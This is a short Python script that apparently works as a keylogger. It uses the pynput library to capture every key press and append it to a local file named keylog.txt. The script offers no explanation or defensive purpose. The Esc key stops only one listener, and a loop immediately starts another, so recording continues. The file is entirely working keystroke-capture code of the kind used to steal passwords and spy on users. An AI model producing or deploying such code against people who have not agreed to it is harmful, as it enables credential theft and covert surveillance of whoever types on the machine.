from pynput import keyboard
import time


logfile="keylog.txt"
def on_press(key):
    ofile=open(logfile,"a")
    try: 
        k = key.char # single-char keys
    except: 
        k = key.name # other keys
    if key == keyboard.Key.esc: 
        return False # stop listener
    if k not in ['']: # keys interested
        #print('kp:' + k)
        #return False # remove this if want more keys
        ofile.write("kp:"+k+"\n")
    ofile.close()
while True:
    lis = keyboard.Listener(on_press=on_press)
    lis.start() # start to listen on a separate thread
    lis.join() # no this if main thread is polling self.keys
